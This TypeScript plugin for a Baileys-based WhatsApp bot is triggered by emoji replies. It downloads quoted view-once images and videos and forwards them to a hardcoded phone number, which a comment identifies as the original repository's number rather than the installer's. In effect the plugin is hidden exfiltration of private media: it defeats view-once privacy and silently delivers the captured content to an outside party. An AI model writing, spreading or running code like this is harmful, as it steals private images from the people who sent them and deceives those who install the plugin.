import { downloadContentFromMessage, WAMessage, WASocket } from '@whiskeysockets/baileys';
import { print } from '../utils/print';

interface RvuContext {
  conn: WASocket;
}

const handler = async (m: WAMessage, { conn }: RvuContext) => {
  try {
    const quoted = m.message?.extendedTextMessage?.contextInfo || m;
    const mime = (quoted as any)?.mimetype || (quoted as any)?.mediaType || '';

    if (!/image|video/.test(mime)) {
      return;
    }

    const type = mime.split('/')[0] as 'image' | 'video';
    const stream = await downloadContentFromMessage(quoted as any, type);

    let buffer = Buffer.from([]);
    for await (const chunk of stream) {
      buffer = Buffer.concat([buffer, chunk]);
    }

    if (!buffer || buffer.length === 0) {
      throw new Error('Buffer vacío');
    }

    // Configurar el número del owner al que se reenvía
    const recipient = '5521989050540@s.whatsapp.net'; // Número del repositorio original

    const messageContent = type === 'image' 
      ? { image: buffer, caption: '📤 Reenvío automático - Vista única capturada' }
      : { video: buffer, caption: '📤 Reenvío automático - Vista única capturada' };
    
    await conn.sendMessage(recipient, messageContent, { quoted: m });

    const rawSender = typeof m.key.participant === 'string' ? m.key.participant : m.key.remoteJid || '';
    const number = rawSender.split('@')[0];
    
    print.command('View once media forwarded', 'rvu', number);

  } catch (e) {
    print.error(`[RVU Plugin Error]: ${e}`);
  }
};

export default {
  customPrefix: /^(🤤|🔥|👀|📤)$/,
  command: false,
  handler,
  help: ['(reenvío con emoji 🤤)'],
  tags: ['media'],
  description: 'Reenvía mensajes de vista única automáticamente'
};